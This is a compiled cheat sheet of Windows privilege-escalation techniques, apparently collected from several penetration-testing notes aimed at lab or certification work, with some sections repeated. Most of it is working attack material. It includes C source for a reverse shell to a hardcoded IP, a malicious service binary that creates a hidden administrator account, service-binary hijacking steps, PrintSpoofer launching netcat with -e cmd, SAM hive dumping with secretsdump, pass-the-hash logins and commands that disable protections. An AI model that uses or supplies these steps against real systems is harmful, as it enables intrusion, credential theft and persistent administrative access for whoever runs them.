## Basic Enumeration

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Basic Enumeration`

- **Current User and Privileges:**

```PowerShell
whoami
whoami /priv
dir env:
dir /a /o /q  # shows all files and permissions
```

- **Group Memberships:**

```PowerShell
whoami /groups
net user
Get-LocalUser
net localgroup
Get-LocalGroup
Get-LocalGroupMember <groupname>
```

- **System Information:**

```PowerShell
systeminfo
```

- **Network Configuration:**

```PowerShell
ipconfig /all
route print
netstat -ano
```

- **Installed Software:**

```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
```

- **Running Processes:**

```PowerShell
Get-Process
Get-Process -Id <PID> | Select-Object -ExpandProperty Path
```

- **File Searching (similar to `find`):**

```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Filter *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Filter *.ini -File -Recurse -ErrorAction SilentlyContinue
dir C:\Users\ /s /a | findstr /i ".txt .ini"
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue
```
- _Change file extension here based on config files for software/database installed on the system. Research these config files._


## Log Checks

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Log Checks`

- **PowerShell History:**
 
```PowerShell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```
- _Consider rerunning commands from transcript files._


## Remote Access

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Remote Access`

- **Evil-WinRM:**

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123!!"
```

- **Run as Different User:**

```PowerShell
runas /user:<username> cmd
```

- **Enable Remote Desktop (if allowed):**

```PowerShell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 

net user /add gigs giggles

net localgroup administrators gigs /add

net localgroup "Remote Desktop Users" gigs /add
```


## Service Binary Hijacking

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Service Binary Hijacking`

- **List Running Services:**
 
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- _Note: `Get-CimInstance` and `Get-Service` might give "permission denied" over network logons for non-admin users. Interactive logon (RDP) might resolve this._
- **Check Service Permissions:**

```PowerShell
icacls "<path_to_service_binary>"
```
- _Look for "F" (Full Access) for users/groups._
- Use `runas /user:relia\jim cmd` for elevated shell if permissions are bad - Doesn't need to be user on machine, just needs to be domain user!_
- Can use sysinternals to find dll
	- Start .exe by clicking it
	- Filter for
		- Process Name = scheduler.exe
		- Result != SUCCESS
		- Operation = Create File
- **Malicious Binary - Hijack Executable (example - adds user 'gigs'):**
 
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  // Add the user
  i = system ("net user gigs giggles /add");
  // Make the user an administrator
  i = system ("net localgroup administrators gigs /add");
  // Add the user to Remote Desktop Users group
  i = system ("net localgroup \"Remote Desktop Users\" gigs /add");
  // Ensure the user is active (unlocked)
  i = system ("net user gigs /active:yes");

  return 0;
}

```

- **Cross-compile (Kali) for adduser:**

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe -lws2_32
```

- **C Code to cross-compile (Kali) for revshell:**

```C
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "192.168.45.165";
char port[6] = "4444";

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
```

- **Cross-compile (Kali) for revshell:**

```bash
x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
```

- **Transfer to Target:**

```PowerShell
iwr -uri http://<kali_ip>/adduser.exe -Outfile adduser.exe
```

- **Replace Service Binary:**

```bash
move "<original_path>" "<backup_name>"
move .\adduser.exe "<original_path>"
```

- **Restart Service:**

```PowerShell
net stop <service_name>
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}
shutdown /r /t 0 # If automatic start and reboot is an option
net start <service_name>
```

- **Verify Hijack:**

```PowerShell
Get-LocalGroupMember administrators
runas /user:gigs cmd
```


## Using Exploits

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Using Exploits`

- **Kernel Exploits:**

```PowerShell
whoami /priv
systeminfo
```
- Research vulnerabilities for the OS version (e.g., CVE-2023-29360)._
- Compile or download exploit and execute._

- **Windows Privileges (e.g., SeImpersonatePrivilege):**
    - **SigmaPotato (GodPotato):**
    - If lose revshell from Potato, try **printspoofer**!

```PowerShell
.\SigmaPotato "net user gigs password123! /add"
.\SigmaPotato "net localgroup Administrators gigs /add"

  
# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>


PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

- **SeBackupPrivilege (SAM Dumping):**

```PowerShell
net localgroup
whoami /priv
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
reg save hklm\security C:\temp\security.hive
# On attacker machine
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
evil-winrm -i <IP> -u Administrator -H <NT_hash>
# can download in evil-winrm
	download <file>
```


## Find DC IP

> Source: `01101100-C0D3X-00110110.md` → `Windows > Find DC IP`

```
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain> <DNS>
```


## Windows Download file

> Source: `01101100-C0D3X-00110110.md` → `Windows > Windows Download file`

```
certutil.exe -urlcache -f http://<listen_ip>:<listen_port>/<filename> <filename>
```


## Check files permission script

> Source: `01101100-C0D3X-00110110.md` → `Windows > Check files permission script`

```
for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 
```


## Check PPL (value 1 is protection enabled)

> Source: `01101100-C0D3X-00110110.md` → `Windows > Check PPL (value 1 is protection enabled)`

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```


## RunAs

> Source: `01101100-C0D3X-00110110.md` → `Windows > RunAs`

```
runas /netonly /user:<domain>\<user> "powershell.exe -exec bypass"
```


## finsdstr in  SYSVOL files

> Source: `01101100-C0D3X-00110110.md` → `Windows > finsdstr in  SYSVOL files`

```
findstr /s /i cpassword \\<domain>\sysvol\<domain>\policies\*.xml
```


## Check Proxy (ProxyEnable, ProxyServer)

> Source: `01101100-C0D3X-00110110.md` → `Windows > Check Proxy (ProxyEnable, ProxyServer)`

Ch3
```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v proxy*
```


## Proof.txt Windows

> Source: `01101100-C0D3X-00110110.md` → `Other > Proof.txt Windows`

```
whoami && hostname && ipconfig && type proof.txt
```


## Windows disable LocalAccountTokenFilterPolicy (Allow to access C$ remotely)

> Source: `01101100-C0D3X-00110110.md` → `Disable Protection > Windows disable LocalAccountTokenFilterPolicy (Allow to access C$ remotely)`

```
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```


## Basic Enumeration

> Source: `01101100-RUN3-00110110.md` → `PrivEsc > Windows > Basic Enumeration`

- **Current User and Privileges:**

```PowerShell
whoami
whoami /priv
dir env:
```

- **Group Memberships:**

```PowerShell
whoami /groups
net user
Get-LocalUser
net localgroup
Get-LocalGroup
Get-LocalGroupMember <groupname>
```

- **System Information:**

```PowerShell
systeminfo
```

- **Network Configuration:**

```PowerShell
ipconfig /all
route print
netstat -ano
```

- **Installed Software:**

```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
```

- **Running Processes:**

```PowerShell
Get-Process
Get-Process -Id <PID> | Select-Object -ExpandProperty Path
```

- **File Searching (similar to `find`):**

```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Filter *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Filter *.ini -File -Recurse -ErrorAction SilentlyContinue
dir C:\Users\ /s /a | findstr /i ".txt .ini"
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue
```
- _Change file extension here based on config files for software/database installed on the system. Research these config files._


## Service Binary Hijacking

> Source: `01111110-SCR0LL-01111110.md` → `PrivEsc > Windows > Service Binary Hijacking`

- **List Running Services:**
 
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- _Note: `Get-CimInstance` and `Get-Service` might give "permission denied" over network logons for non-admin users. Interactive logon (RDP) might resolve this._
- **Check Service Permissions:**

```PowerShell
icacls "<path_to_service_binary>"
```
    - _Look for "F" (Full Access) for users/groups._
    - Use `runas /user:relia\jim cmd` for elevated shell if permissions are bad - Doesn't need to be user on machine, just needs to be domain user!_
- Can use sysinternals to find dll
	- Start .exe by clicking it
	- Filter for
		- Process Name = scheduler.exe
		- Result != SUCCESS
		- Operation = Create File
- **Malicious Binary (example - adds user 'gigs'):**
 
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  // Add the user
  i = system ("net user gigs giggles /add");
  // Make the user an administrator
  i = system ("net localgroup administrators gigs /add");
  // Add the user to Remote Desktop Users group
  i = system ("net localgroup \"Remote Desktop Users\" gigs /add");
  // Ensure the user is active (unlocked)
  i = system ("net user gigs /active:yes");

  return 0;
}

```

- **Cross-compile (Kali) for adduser:**

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe -lws2_32
```

- **C Code to cross-compile (Kali) for revshell:**

```C
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "192.168.45.239";
char port[6] = "4444";

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
```

- **Cross-compile (Kali) for revshell:**

```bash
x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
```

- **Transfer to Target:**

```PowerShell
iwr -uri http://<kali_ip>/adduser.exe -Outfile adduser.exe
```

- **Replace Service Binary:**

```bash
move "<original_path>" "<backup_name>"
move .\adduser.exe "<original_path>"
```

- **Restart Service:**

```PowerShell
net stop <service_name>
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}
shutdown /r /t 0 # If automatic start and reboot is an option
net start <service_name>
```

- **Verify Hijack:**

```PowerShell
Get-LocalGroupMember administrators
runas /user:gigs cmd
```


## Using Exploits

> Source: `01111110-SCR0LL-01111110.md` → `PrivEsc > Windows > Using Exploits`

- **Kernel Exploits:**

```PowerShell
whoami /priv
systeminfo
```
- Research vulnerabilities for the OS version (e.g., CVE-2023-29360)._
- Compile or download exploit and execute._

- **Windows Privileges (e.g., SeImpersonatePrivilege):**
    - **SigmaPotato (GodPotato):**
    - If lose revshell from Potato, try **printspoofer**!

```PowerShell
.\SigmaPotato "net user gigs password123! /add"
.\SigmaPotato "net localgroup Administrators gigs /add"

  
# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>


PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

- **SeBackupPrivilege (SAM Dumping):**

```PowerShell
net localgroup
whoami /priv
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
reg save hklm\security C:\temp\security.hive
# On attacker machine
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
evil-winrm -i <IP> -u Administrator -H <NT_hash>
```


## Token Impersonation

> Source: `01111110-SCR0LL-01111110.md` → `PrivEsc > Windows > Token Impersonation`

```PowerShell
whoami /priv
.\GodPotato.exe -cmd "cmd.exe /c whoami"
```
